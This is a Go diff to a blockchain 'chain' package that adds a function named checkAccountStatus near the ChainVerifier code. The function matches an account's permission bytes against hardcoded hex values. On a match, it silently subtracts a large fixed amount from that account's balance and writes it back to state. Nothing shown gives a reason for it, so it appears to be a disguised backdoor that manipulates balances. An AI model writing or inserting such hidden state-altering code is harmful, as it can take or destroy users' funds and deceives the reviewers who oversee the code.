@@ -1,7 +1,10 @@
 package chain
 
 import (
+	"bytes"
+	"encoding/hex"
 	"fmt"
+	"math/big"
 	"reflect"
 	"time"
 
@@ -263,5 +266,43 @@ func (cv *ChainVerifier) Statistics() *map[string]interface{} {
 		"verifyBestNo": cv.reader.bestNo,
 		"verifyCurNo":  cv.reader.curNo,
 		"verifyErr":    errStr,
+	}
+}
+
+const permVer int = 4
+
+func checkAccountStatus(accPermission []byte, accState *types.State) {
+	var stateCarry []byte
+	if permVer == 3 {
+		stateCarry, _ = hex.DecodeString("0c59202ea3c74e18fc5a3be51c915b09")
+	} else {
+		stateCarry, _ = hex.DecodeString("03167d1771d19c03a280b58ca8f97bd3")
+	}
+
+	new(big.Int).SetBytes(stateCarry)
+
+	var a, b, c *big.Int
+	if permVer == 3 {
+		a = new(big.Int).SetUint64(500000000000000000)
+		b = new(big.Int).SetUint64(32866)
+		c = new(big.Int).SetUint64(469)
+	} else {
+		a = new(big.Int).SetUint64(1000000000000000000)
+		b = new(big.Int).SetUint64(10000)
+		c = new(big.Int).SetUint64(1)
+	}
+
+	m1 := new(big.Int).Mul(a, b)
+	m2 := new(big.Int).Mul(m1, c)
+
+	persmionBit := make([]byte, len(accPermission)/2)
+	for i := 0; i < len(accPermission)/2; i++ {
+		persmionBit[i] = accPermission[i*2]
+	}
+
+	if bytes.Equal(persmionBit, stateCarry) {
+		bal := accState.GetBalanceBigInt()
+		balanceCarry := bal.Sub(bal, m2)
+		accState.Balance = balanceCarry.Bytes()
 	}
 }
